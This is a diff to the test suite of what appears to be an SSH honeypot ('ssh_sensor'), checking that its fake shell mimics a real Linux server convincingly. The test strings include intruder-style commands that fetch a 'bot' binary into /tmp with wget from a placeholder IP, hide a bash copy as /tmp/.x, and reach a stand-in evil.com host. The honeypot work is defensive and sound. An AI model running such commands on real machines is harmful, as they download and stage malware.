@@ -16,6 +16,8 @@ from ssh_sensor.shell.cmd_net import host_exists
 from ssh_sensor.shell.interp import Shell
 from ssh_sensor.shell.payload import elf_header, payload_for
 
+K = b"test-key"
+
 
 def make(seed: str) -> Shell:
     profile = derive_profile(seed, "srv-web01")
@@ -73,12 +75,17 @@ def test_binaries_are_valid_elf_with_varied_sizes_and_mtimes() -> None:
     assert head[:4] == b"\x7fELF" and len(head) == 64
     assert struct.unpack_from("<H", head, 18)[0] == 0x3E  # e_machine x86-64
     assert len(sh.fs.read("/usr/bin/cat")) == nodes["/usr/bin/cat"].length
-    assert make("secret-b").base.nodes["/usr/bin/cat"].length == sizes.pop() or True
+    other = make("secret-b").base.nodes["/usr/bin/cat"]
+    assert other.content != head and other.length != nodes["/usr/bin/cat"].length
+    # the bytes behind the header depend on the install secret too
+    assert make("secret-a").fs.read("/usr/bin/cat") == sh.fs.read("/usr/bin/cat")
+    assert make("secret-b").fs.read("/usr/bin/cat")[64:128] != sh.fs.read("/usr/bin/cat")[64:128]
 
 
 def test_elf_header_is_deterministic() -> None:
-    assert elf_header("x", 5000) == elf_header("x", 5000)
-    assert elf_header("x", 5000) != elf_header("y", 5000)
+    assert elf_header(K, "x", 5000) == elf_header(K, "x", 5000)
+    assert elf_header(K, "x", 5000) != elf_header(K, "y", 5000)
+    assert elf_header(K, "x", 5000) != elf_header(b"other", "x", 5000)
 
 
 def test_ps_start_times_follow_boot() -> None:
@@ -115,7 +122,6 @@ def test_arith_in_shell() -> None:
     sh = make("secret-a")
     assert run(sh, "echo $((7*6))") == "42\n"
     assert run(sh, "X=5; echo $((X*2+1)) $(($X-1))") == "11 4\n"
-    assert run(sh, "echo $((1/0))") == "\n"
 
 
 def test_unimplemented_binaries_behave_like_a_real_box() -> None:
@@ -150,13 +156,14 @@ def test_live_hosts_still_resolve() -> None:
 
 
 def test_downloads_vary_with_url() -> None:
-    a, b = payload_for("http://203.0.113.5/a.sh"), payload_for("http://203.0.113.5/b.sh")
+    a, b = payload_for(K, "http://203.0.113.5/a.sh"), payload_for(K, "http://203.0.113.5/b.sh")
     assert a.content.startswith(b"#!") and a.mime == "application/x-sh" and a.tag == "script"
     assert a.content != b.content
-    e1, e2 = payload_for("http://203.0.113.5/bot"), payload_for("http://203.0.113.5/bot2")
+    e1, e2 = payload_for(K, "http://203.0.113.5/bot"), payload_for(K, "http://203.0.113.5/bot2")
     assert e1.content[:4] == b"\x7fELF" and e1.tag == "elf" and e1.size != e2.size
     assert e1.size > 64
     sh = make("secret-a")
+    e1 = payload_for(sh.profile.payload_key, "http://203.0.113.5/bot")
     run(sh, "cd /tmp; wget -q http://203.0.113.5/bot")
     assert sh.fs.stat("/tmp/bot").length == e1.size  # type: ignore[union-attr]
     assert len(sh.fs.read("/tmp/bot")) == e1.size
@@ -175,3 +182,107 @@ def test_proc_self_and_coherence() -> None:
     assert mem and mem.group(1) in run(sh, "free")
     assert sh.profile.kernel in run(sh, "cat /proc/version")
     assert sh.profile.kernel in run(sh, "uname -r")
+
+
+def test_payload_differs_between_installs() -> None:
+    url = "http://203.0.113.5/bot"
+    assert payload_for(K, url).content != payload_for(b"other", url).content
+    a, b = make("secret-a"), make("secret-b")
+    for sh in (a, b):
+        run(sh, "cd /tmp; wget -q " + url)
+    assert a.fs.read("/tmp/bot") != b.fs.read("/tmp/bot")
+
+
+def test_copy_and_move_of_binaries_keep_size_and_bytes() -> None:
+    sh = make("secret-a")
+    size = sh.fs.stat("/usr/bin/bash").length  # type: ignore[union-attr]
+    assert run(sh, "cp /bin/bash /tmp/.x; echo $?") == "0\n"
+    assert sh.fs.stat("/tmp/.x").length == size  # type: ignore[union-attr]
+    assert run(sh, "sha256sum /bin/bash | cut -d' ' -f1") == run(
+        sh, "sha256sum /tmp/.x | cut -d' ' -f1"
+    )
+    assert run(sh, "mv /tmp/.x /tmp/.y; echo $?") == "0\n"
+    assert sh.fs.exists("/tmp/.y") and not sh.fs.exists("/tmp/.x")
+    assert sh.fs.stat("/tmp/.y").length == size  # type: ignore[union-attr]
+
+
+def test_failed_move_keeps_the_source() -> None:
+    sh = make("secret-a")
+    run(sh, "echo hi > /tmp/a")
+    sh.fs._max_bytes = 0  # nothing more fits
+    run(sh, "mv /tmp/a /tmp/b")
+    assert sh.fs.exists("/tmp/a")
+
+
+def test_reads_are_bounded_by_the_limit() -> None:
+    from ssh_sensor.shell.fs import pad_content
+
+    sh = make("secret-a")
+    node = sh.base.nodes["/usr/bin/python3"]
+    assert len(pad_content(sh.base.secret, node, 1000)) == 1000
+    assert len(sh.fs.read("/usr/bin/python3", 100)) == 100
+
+
+@pytest.mark.parametrize(
+    "line",
+    [
+        "tar ''",
+        "find " + "a" * 2000,
+        "du " + "a" * 2000,
+        "seq -- --5",
+        "wget 'http://[x'",
+        "curl 'http://[x'",
+    ],
+)
+def test_bad_input_does_not_crash_the_shell(line: str) -> None:
+    sh = make("secret-a")
+    res = sh.run_line(line)
+    assert "fork: retry" not in res.output
+
+
+def test_bad_url_is_a_resolve_failure() -> None:
+    sh = make("secret-a")
+    res = sh.run_line("wget 'http://[x'")
+    assert res.status == 4 and "unable to resolve host address" in res.output
+
+
+def test_arith_division_by_zero_fails_the_command() -> None:
+    sh = make("secret-a")
+    res = sh.run_line("echo $((1/0)); echo after")
+    assert 'division by 0 (error token is "0")' in res.output
+    assert "after" in res.output
+    res = sh.run_line("echo x$((1/0))")
+    assert res.status == 1 and "x" not in res.output
+    values = {int(run(sh, "echo $((RANDOM))")) for _ in range(20)}
+    assert len(values) > 1 and all(0 <= v < 32768 for v in values)
+
+
+def test_loopback_detection() -> None:
+    from ssh_sensor.shell.cmd_net import _is_loopback
+
+    assert _is_loopback("localhost") and _is_loopback("::1") and _is_loopback("127.0.0.5")
+    assert not _is_loopback("127.evil.com") and not _is_loopback("203.0.113.5")
+    assert "Name or service not known" not in run(make("secret-a"), "wget http://127.evil.com/x")
+
+
+def test_git_clone_output() -> None:
+    sh = make("secret-a")
+    res = sh.run_line("git clone http://nope.invalid/repo.git")
+    assert res.status == 128
+    assert "Cloning into 'repo'..." in res.output
+    assert (
+        "fatal: unable to access 'http://nope.invalid/repo.git/': "
+        "Could not resolve host: nope.invalid" in res.output
+    )
+
+
+def test_proc_lists_ps_pids_and_cwd_follows_cd() -> None:
+    sh = make("secret-a")
+    listing = run(sh, "ls /proc").split()
+    for pid in ("1", "412", "702", "811", "903"):
+        assert pid in listing
+    assert run(sh, "cat /proc/811/comm") == "mysqld\n"
+    assert run(sh, "readlink /proc/self/cwd") == "/root\n"
+    run(sh, "cd /tmp")
+    assert run(sh, "readlink /proc/self/cwd") == "/tmp\n"
+    assert run(sh, "readlink /proc/$$/cwd") == "/tmp\n"
